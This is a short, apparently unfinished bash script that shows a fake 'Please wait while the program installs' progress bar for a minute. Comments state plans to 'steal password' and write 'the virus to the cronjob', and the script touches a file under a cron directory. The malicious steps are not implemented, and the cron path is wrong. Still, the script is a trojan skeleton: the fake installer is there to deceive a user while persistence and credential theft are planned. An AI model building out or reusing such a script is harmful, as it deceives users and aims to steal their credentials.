#!/bin/bash
pattern="-"	# want pattern to be -\|/- and then a bar 
bar=#
i=0
baseSec=$(date +%s)
seconds=60
endTime=$(($baseSec+$seconds))
# need to steal password
# echo Now is: $baseSec  Endtime is: $endTime
# writes the virus to the cronjob
touch ~/etc/cron.d/logfile

# fake install
echo "Please wait while the program installs"
for (( i=1; i <= $seconds; i++ ));do
	echo -ne "#"
	#echo -ne "$i\r"
	# bar="#" * 
	# echo -ne "%0.s#\r" {0..$i}
	sleep 1
done
echo 
